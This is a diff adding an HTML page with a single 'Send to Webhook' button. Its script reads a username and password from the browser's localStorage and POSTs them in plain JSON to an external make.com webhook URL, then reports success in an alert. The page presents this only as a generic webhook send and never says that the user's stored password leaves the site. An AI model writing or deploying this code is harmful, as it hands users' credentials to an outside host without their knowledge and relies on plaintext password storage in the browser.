@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Send to Webhook</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    button {
+      font-size: 18px;
+      padding: 15px 30px;
+      background: #28a745;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <button onclick="sendWebhook()">Send to Webhook</button>
+
+  <script>
+    function sendWebhook() {
+      const username = localStorage.getItem("username");
+      const password = localStorage.getItem("password");
+
+      fetch("https://hook.eu2.make.com/v1pq77664srkkgof9ff5vtgd1jdhn6g5", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          username: username,
+          password: password
+        })
+      })
+      .then(response => {
+        alert("Webhook sent successfully!");
+      })
+      .catch(error => {
+        alert("Error sending webhook");
+      });
+    }
+  </script>
+
+</body>
+</html>
